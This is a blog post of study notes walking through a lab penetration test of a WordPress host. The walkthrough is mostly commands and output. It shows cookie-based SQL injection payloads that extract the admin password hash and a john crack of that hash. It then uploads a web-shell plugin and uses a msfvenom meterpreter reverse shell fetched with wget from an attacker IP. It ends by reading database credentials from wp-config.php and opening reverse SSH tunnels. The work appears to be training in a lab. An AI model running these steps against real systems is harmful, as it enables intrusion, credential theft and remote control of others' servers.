<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Study Notes - 2021/07/11"><meta name="keywords" content="Study Notes,Penetration Testing"><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>Study Notes - 2021/07/11 | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Penetration-Example"><span class="toc-number">1.</span> <span class="toc-text">Penetration Example</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Add-host-name-Optional"><span class="toc-number">2.</span> <span class="toc-text">Add host name (Optional)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-scan"><span class="toc-number">3.1.</span> <span class="toc-text">nmap scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#targeting-the-web-application"><span class="toc-number">3.2.</span> <span class="toc-text">targeting the web application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection-through-cookie"><span class="toc-number">3.3.</span> <span class="toc-text">SQL injection through cookie</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumerating-the-admin-interface"><span class="toc-number">4.</span> <span class="toc-text">Enumerating the admin interface</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Post-Exploitation-Enumeration"><span class="toc-number">5.</span> <span class="toc-text">Post-Exploitation Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Creating-a-stable-pivot-point"><span class="toc-number">6.</span> <span class="toc-text">Creating a stable pivot point</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Targeting-the-database"><span class="toc-number">7.</span> <span class="toc-text">Targeting the database</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Deeper-Enumeration-of-the-Web-Application-Server"><span class="toc-number">8.</span> <span class="toc-text">Deeper Enumeration of the Web Application Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#search-for-DB-credentials"><span class="toc-number">8.1.</span> <span class="toc-text">search for DB credentials</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Targeting-the-database-again"><span class="toc-number">9.</span> <span class="toc-text">Targeting the database again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Create-a-stable-reverse-tunnel"><span class="toc-number">10.</span> <span class="toc-text">Create a stable reverse tunnel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dynamic-port-forwarding"><span class="toc-number">10.1.</span> <span class="toc-text">Dynamic port forwarding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeting-Poultry"><span class="toc-number">10.2.</span> <span class="toc-text">Targeting Poultry</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">29</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">11</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Study Notes - 2021/07/11</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Penetration-Example"><a href="#Penetration-Example" class="headerlink" title="Penetration Example"></a>Penetration Example</h1><h1 id="Add-host-name-Optional"><a href="#Add-host-name-Optional" class="headerlink" title="Add host name (Optional)"></a>Add host name (Optional)</h1><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sC -sS -p0-65535 sandbox.local</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-11 12:49 EDT</span><br><span class="line">Nmap scan report for sandbox.local (10.11.1.250)</span><br><span class="line">Host is up (0.025s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22&#x2F;tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 86:8f:89:36:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)</span><br><span class="line">|   256 de:f3:84:f1:cd:f3:c8:9a:30:6d:60:e8:b1:1d:99:27 (ECDSA)</span><br><span class="line">|_  256 14:6a:ba:77:e0:57:e5:0c:c0:cc:76:31:91:8d:dd:9f (ED25519)</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-title: SandBox &amp;#8211; See the future, Feel the shine</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 126.77 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>autorecon: <code>autorecon -t target.txt</code></p>
<h2 id="targeting-the-web-application"><a href="#targeting-the-web-application" class="headerlink" title="targeting the web application"></a>targeting the web application</h2><p>nmap scan indicate the webpage generated by wordpress5.3, looking for themes and plugins, may become our target.</p>
<p>Perform a basic directory brute force to discover any sensitive files and confirm it is actually wordpress.</p>
<p>autorecon results are stored in “resutls/scan/tcp_80_http_feroxbuster.txt”, autorecon uses <code>feroxbuster</code><br>Some common wordpress directory in the target:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">301        9l       28w      317c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-admin</span><br><span class="line">301        9l       28w      319c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-blog-header.php</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-config.php</span><br><span class="line">301        9l       28w      320c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-includes</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-cron.php</span><br><span class="line">200       11l       23w      220c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-links-opml.php</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-load.php</span><br><span class="line">200       91l      324w     4874c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-login.php</span><br><span class="line">403      121l      315w     2709c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-mail.php</span><br><span class="line">302        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-signup.php</span><br></pre></td></tr></table></figure>
<p>the tutorial uses dirb:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;sandbox.local</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-includes&#x2F;</span><br></pre></td></tr></table></figure>
<p>dirb seems did some recursive search under each directory</p>
<p>use wp scan for wordpress vul scan:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o wpscan.txt -f cli-no-color</span><br></pre></td></tr></table></figure>
<p>(–enumerate) to include “All Plugins” (ap), “All Themes” (at), “Config backups” (cb), and “Db exports” (dbe).</p>
<p>Found some plugins</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elementor</span><br><span class="line">ocean-extra</span><br><span class="line">wp-survey-and-poll</span><br></pre></td></tr></table></figure>

<p>Use searchsploit to search for vulns, first search their name, but nonthing found</p>
<p>search for survey and poll</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wordpress survey poll</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                    |  Path</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line">WordPress Plugin Survey &amp; Poll 1.5.7.3 - &#39;sss_params&#39; SQL Injecti | php&#x2F;webapps&#x2F;45411.txt</span><br><span class="line">WordPress Plugin Survey and Poll 1.1 - Blind SQL Injection        | php&#x2F;webapps&#x2F;36054.txt</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>wpscan indicate the plugin version could be <code>1.5.7.3 </code></p>
<p>look at its description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45411.txt</span><br><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#&quot;]</span><br></pre></td></tr></table></figure>

<p>Use burpsuite to intercept the communication</p>
<h2 id="SQL-injection-through-cookie"><a href="#SQL-injection-through-cookie" class="headerlink" title="SQL injection through cookie"></a>SQL injection through cookie</h2><p>Use burpsuite repeater,<br>proxy-&gt;http_history-&gt;find the request-&gt;send to repeater</p>
<p>replace the cookie with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#&quot;]</span><br></pre></td></tr></table></figure>
<p>and send to the server,<br>find db version: <code>10.3.20-MariaDB</code>  </p>
<p>get a list of table:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#&quot;]</span><br></pre></td></tr></table></figure>
<p>find an interesting table: <code>wp_users</code><br>find its coloums: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns where table_name&#x3D;&#39;wp_users&#39;#&quot;];</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\&quot;ID\&quot;],[\&quot;user_login\&quot;],[\&quot;user_pass\&quot;],[\&quot;user_nicename\&quot;],[\&quot;user_email\&quot;],[\&quot;user_url\&quot;],[\&quot;user_registered\&quot;],[\&quot;user_activation_key\&quot;],[\&quot;user_status\&quot;],[\&quot;display_name\&quot;]]&#125;</span><br></pre></td></tr></table></figure>
<p>get login name:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#&quot;];</span><br></pre></td></tr></table></figure>
<p><code>wp_ajla_admin</code><br>get password:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users where user_login&#x3D;&#39;wp_ajla_admin&#39;#&quot;];</span><br></pre></td></tr></table></figure>
<p>the result is hash：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[\&quot;$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\&#x2F;\&quot;]</span><br><span class="line">$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i&#x2F;</span><br></pre></td></tr></table></figure>
<p>it uses three <code>\\\</code> to escape a single / </p>
<p>cracking the password from hash, use the rockyou wordlist: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i&#x2F;&#39; &gt; pass.txt</span><br><span class="line"></span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pass.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128&#x2F;128 AVX 4x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">!love29jan2006!  (?)</span><br><span class="line">1g 0:00:19:52 DONE (2021-07-11 15:22) 0.000838g&#x2F;s 12018p&#x2F;s 12018c&#x2F;s 12018C&#x2F;s !luv2:P..!lilkilla!</span><br><span class="line">Use the &quot;--show --format&#x3D;phpass&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Login the wp page with password: <code>wp_ajla_admin</code>/<code>!love29jan2006!</code><br><a target="_blank" rel="noopener" href="http://sandbox.local/wp-admin">http://sandbox.local/wp-admin</a></p>
<h1 id="Enumerating-the-admin-interface"><a href="#Enumerating-the-admin-interface" class="headerlink" title="Enumerating the admin interface"></a>Enumerating the admin interface</h1><p>For wordpress, look at the info tag: tool-&gt;site_health-&gt;info</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">Server architecture	Linux 4.4.0-21-generic x86_64</span><br><span class="line">Web server	Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">PHP version	7.0.33-0ubuntu0.16.04.7 (Supports 64bit values)</span><br><span class="line"></span><br><span class="line">Database:</span><br><span class="line">Extension	mysqli</span><br><span class="line">Server version	10.3.20-MariaDB</span><br><span class="line">Client version	mysqlnd 5.0.12-dev - 20150407 - $Id: b5c5906d452ec590732a93b051f3827e02749b83 $</span><br><span class="line">Database user	wp</span><br><span class="line">Database host	10.5.5.11</span><br></pre></td></tr></table></figure>

<p>Database in running on <code>10.5.5.11</code>, different from what we are targeting. <code>10.11.1.250</code></p>
<p>we can install our own plugins, there are some malicious wordpress plugins</p>
<p>in <code>seclis</code>： <code>cd /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php</code></p>
<p>upload plugin and get error:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature</span><br></pre></td></tr></table></figure>

<p>Search online, and find that I need to pack the php file to zip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip bad_plugin.zip &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php</span><br></pre></td></tr></table></figure>
<p>then upload </p>
<p>fatal error when try to activate:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin could not be activated because it triggered a fatal error.</span><br></pre></td></tr></table></figure>
<p>it dont need to be activate </p>
<p>test:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>
<p>ok, it works, then we tries to generate a reverse shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.119.165 LPORT&#x3D;443 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
<p>we know the target is a linux machine, we use LPORT=443 to evade any outbound firewall rules</p>
<p>then upload the shell to that machine, create a python sever at current directory</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p>download the shell binary</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;wget%20http:&#x2F;&#x2F;192.168.119.165&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
<p>use <code>%20</code> to replace space in url</p>
<p>start a listening port</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo msfconsole -q -x &quot;use exploit&#x2F;multi&#x2F;handler;\</span><br><span class="line">&gt; set PAYLOAD linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp;\</span><br><span class="line">&gt; set LHOST 192.168.119.165;\</span><br><span class="line">&gt; set LPORT 443;\</span><br><span class="line">&gt; run&quot;</span><br></pre></td></tr></table></figure>

<p>execute the reverse shell, first check the permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;ls%20-l%20shell.elf</span><br><span class="line"># change the permission</span><br><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;chmod%20777%20shell.elf</span><br></pre></td></tr></table></figure>
<p>run</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;.&#x2F;shell.elf</span><br></pre></td></tr></table></figure>

<p>in meterpreter, can goto regular shell use <code>shell</code></p>
<h1 id="Post-Exploitation-Enumeration"><a href="#Post-Exploitation-Enumeration" class="headerlink" title="Post-Exploitation Enumeration"></a>Post-Exploitation Enumeration</h1><p>gather some information such as network config, hostname, os version and kernel info</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ens160    Link encap:Ethernet  HWaddr 00:50:56:bf:19:da  </span><br><span class="line">          inet addr:10.4.4.10  Bcast:10.4.4.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::250:56ff:febf:19da&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:158345 errors:0 dropped:240 overruns:0 frame:0</span><br><span class="line">          TX packets:169172 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:122457155 (122.4 MB)  TX bytes:68118761 (68.1 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:732 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:732 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:67520 (67.5 KB)  TX bytes:67520 (67.5 KB)</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">ajla</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line">Linux ajla 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">Ubuntu 16.04 LTS \n \l</span><br><span class="line"></span><br><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016</span><br></pre></td></tr></table></figure>

<p>find database credentials in the configuration file: <code>wp-config.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">cat wp-config.php</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wp&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;Lv9EVQq86cfi8ioWsqFUQyU&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;10.5.5.11&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br><span class="line"></span><br><span class="line">define( &#39;WP_HTTP_BLOCK_EXTERNAL&#39;, true );</span><br></pre></td></tr></table></figure>

<h1 id="Creating-a-stable-pivot-point"><a href="#Creating-a-stable-pivot-point" class="headerlink" title="Creating a stable pivot point"></a>Creating a stable pivot point</h1><p>when then try to login to the internal network, e.g. the database server <code>10.5.5.11</code><br>since we do not have root access to create ssh server, we should use reverse ssh tunneling</p>
<p>first we need to know which port is running the database server </p>
<p>create a quick portscan script</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">host&#x3D;10.5.5.11</span><br><span class="line">for port in &#123;1..65535&#125;; do</span><br><span class="line">    timeout .1 bash -c &quot;echo &gt;&#x2F;dev&#x2F;tcp&#x2F;$host&#x2F;$port&quot; &amp;&amp;</span><br><span class="line">    echo &quot;port $port is open&quot;</span><br><span class="line">done</span><br><span class="line">echo &quot;Done&quot;</span><br></pre></td></tr></table></figure>

<p>upload the script use meterpreter:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ~&#x2F;script&#x2F;portscan.sh &#x2F;tmp&#x2F;portscan.sh </span><br><span class="line"></span><br><span class="line">chmod +x portscan.sh</span><br><span class="line">.&#x2F;portscan.sh</span><br><span class="line">port 3306 is open</span><br></pre></td></tr></table></figure>

<p>default mariadb port is also <code>3306</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@192.168.119.165</span><br></pre></td></tr></table></figure>

<p>but it will prompt us for 1. accept hostkey, 2. password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; kali@192.168.119.165</span><br></pre></td></tr></table></figure>
<p><code>UserKnownHostsFile</code> do not save host keys<br><code>StrictHostKeyChecking</code> do not prompt </p>
